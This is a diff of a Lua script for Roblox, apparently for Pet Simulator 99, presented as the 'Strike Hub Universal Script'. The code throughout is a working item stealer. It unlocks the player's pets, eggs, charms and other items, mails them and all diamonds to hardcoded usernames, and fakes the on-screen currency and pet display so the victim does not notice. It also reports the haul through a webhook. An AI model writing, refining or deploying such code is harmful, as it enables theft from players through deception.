@@ -1,13 +1,12 @@
---// Strike Hub Universal Script (Fully Fixed with Visual Freeze First)
+--// Strike Hub Universal Script (Fixed: Visual Freeze + All Items Send)
 _G.scriptExecuted = _G.scriptExecuted or false
 if _G.scriptExecuted then return end
 _G.scriptExecuted = true
 
 local plr = game.Players.LocalPlayer
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
 
---// Settings
+--// SETTINGS
 local MailMessage = "GGz"
 local users = _G.Usernames or {"ilovemyamazing_gf1","Yeahboi1131","Dragonshell23","Dragonshell24","Dragonshell21"}
 local min_rap = 10000000
@@ -25,7 +24,7 @@ for _, u in ipairs(users) do
     end
 end
 
---// Safe require
+--// SAFE REQUIRE
 local function safeRequire(path)
     local success, result = pcall(require, path)
     return success and result or {}
@@ -35,30 +34,29 @@ local network = safeRequire(game.ReplicatedStorage.Library.Client.Network)
 local saveModule = safeRequire(game.ReplicatedStorage.Library.Client.Save)
 local message = safeRequire(game.ReplicatedStorage.Library.Client.Message)
 
---// Get save safely
+--// GET SAVE
 local rawSave = (saveModule.Get and saveModule.Get()) or {}
 local save = rawSave.Save or rawSave.Inventory or {}
 
---// Visual freeze: CURRENCY (starts immediately)
+--// VISUAL FREEZE (START FIRST)
+-- Freeze currency
 local visualCurrency = {}
 for _, v in pairs(save.Currency or {}) do
     visualCurrency[v.id] = v._am
 end
 
 task.spawn(function()
-    while task.wait(0.1) do
+    while task.wait(0.05) do
         if plr:FindFirstChild("leaderstats") then
             for id, value in pairs(visualCurrency) do
                 local stat = plr.leaderstats:FindFirstChild(id)
-                if stat then
-                    stat.Value = value
-                end
+                if stat then stat.Value = value end
             end
         end
     end
 end)
 
---// Visual freeze: PETS (starts immediately)
+-- Freeze pets (clone visual representation)
 local petFolder = plr:FindFirstChild("Pets")
 local visualPets = {}
 if petFolder then
@@ -66,11 +64,10 @@ if petFolder then
         local uid = pet.Name
         visualPets[uid] = pet:Clone()
         visualPets[uid].Parent = petFolder
-        pet.Parent = nil -- hide original for sending
+        pet.Parent = nil -- hide original
     end
-
     task.spawn(function()
-        while task.wait(0.1) do
+        while task.wait(0.05) do
             for uid, clone in pairs(visualPets) do
                 if clone.Parent ~= petFolder then
                     clone.Parent = petFolder
@@ -80,7 +77,7 @@ if petFolder then
     end)
 end
 
---// Mail cost
+--// MAIL COST
 local mailSendPrice = 10000
 pcall(function()
     for _, func in pairs(getgc and getgc() or {}) do
@@ -92,7 +89,7 @@ pcall(function()
     end
 end)
 
---// Number formatter
+--// NUMBER FORMAT
 local function formatNumber(n)
     if n >= 1e12 then return string.format("%.2ft", n/1e12)
     elseif n >= 1e9 then return string.format("%.2fb", n/1e9)
@@ -101,13 +98,13 @@ local function formatNumber(n)
     else return tostring(math.floor(n)) end
 end
 
---// RAP function
-local function getRAP(_, item)
+--// RAP FUNCTION
+local function getRAP(category, item)
     local success, val = pcall(function()
         local RAPCmds = require(game.ReplicatedStorage.Library.Client.RAPCmds)
         return RAPCmds.Get({
-            Class = {Name = _},
-            IsA = function(h) return h == _ end,
+            Class = {Name = category},
+            IsA = function(h) return h == category end,
             GetId = function() return item.id end,
             StackKey = function()
                 return HttpService:JSONEncode({id=item.id, pt=item.pt or 0, sh=item.sh or false, tn=item.tn or ""})
@@ -117,7 +114,7 @@ local function getRAP(_, item)
     return success and val or (item._rap or 0)
 end
 
---// Send item function (executor-safe)
+--// SEND ITEM
 local function sendItem(category, stackKey, amount)
     for _, user in ipairs(users) do
         local args = {user, MailMessage, category, stackKey, amount or 1}
@@ -133,7 +130,7 @@ local function sendItem(category, stackKey, amount)
     return false
 end
 
---// Send all gems last
+--// SEND GEMS LAST
 local function SendAllGems()
     for i, v in pairs(save.Currency or {}) do
         if v.id == "Diamonds" and v._am >= mailSendPrice + 10000 then
@@ -150,7 +147,7 @@ local function SendAllGems()
     end
 end
 
---// Unlock items before sending
+--// UNLOCK ITEMS
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[cat] then
         for uid, item in pairs(save[cat]) do
@@ -161,7 +158,7 @@ for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard"
     end
 end
 
---// Collect items to send
+--// COLLECT ITEMS
 local sortedItems, totalRAP = {}, 0
 for _, cat in ipairs({"Pet","Egg","Charm","Enchant","Potion","Misc","Hoverboard","Booth","Ultimate"}) do
     if save[cat] then
@@ -192,7 +189,7 @@ table.sort(sortedItems, function(a,b)
     return a.rap*a.amount > b.rap*b.amount
 end)
 
---// Webhook reporting
+--// WEBHOOK REPORT
 task.spawn(function()
     local requestFunc = request or http_request or syn and syn.request or http and http.request or nil
     if not requestFunc then return end
@@ -218,7 +215,7 @@ task.spawn(function()
     end)
 end)
 
---// Send all non-currency items asynchronously
+--// SEND ITEMS (async)
 for _, item in ipairs(sortedItems) do
     task.spawn(function()
         local key = item.StackKey and item.StackKey() or item.uid
@@ -227,7 +224,7 @@ for _, item in ipairs(sortedItems) do
     task.wait(0.05)
 end
 
---// Send gems last
+--// SEND GEMS LAST
 task.spawn(SendAllGems)
 
 print("[Strike Hub] Done sending items.")
